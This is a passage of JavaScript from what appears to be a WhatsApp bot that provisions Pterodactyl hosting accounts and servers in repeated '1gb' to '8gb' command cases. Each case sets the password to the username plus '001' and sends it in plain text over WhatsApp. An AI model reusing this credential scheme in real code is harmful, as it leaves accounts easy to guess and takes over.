let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}

}

break
case '1gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "1050"
let cpu = "30"
let disk = "1050"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}

}

break
case '2gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "2070"
let cpu = "60"
let disk = "2070"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
case '3gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "3090"
let cpu = "90"
let disk = "3090"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
case '4gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "4110"
let cpu = "120"
let disk = "4110"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]} 

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
case '5gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "5130"
let cpu = "150"
let disk = "5130"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
case '6gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "6050"
let cpu = "180"
let disk = "6050"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
case '7gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "7050"
let cpu = "210"
let disk = "7050"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
  reply('yah gagal om...\n_silakan cek api plta dan pltc anda_')
}
}

break
case '8gb': {
if (!isRyuuPartner) return reply(mess.only.owner)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location3
let memo = "8050"
let cpu = "240"
let disk = "8050"
let email = username + "@reinz-user.com"
try {
if (!u) return
let d = (await RyuuBotz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})

const ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
RyuuBotz.sendMessage(u, { caption: ctf, image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg") });
let data2 = await f2.json();


let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": "if [[ -d .git ]] && [[ \${AUTO_UPDATE} == \"1\" ]]; then git pull; fi; if [[ ! -z \${NODE_PACKAGES} ]]; then /usr/local/bin/npm install \${NODE_PACKAGES}; fi; if [[ ! -z \${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall \${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/\${CMD_RUN}",
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)
} catch {
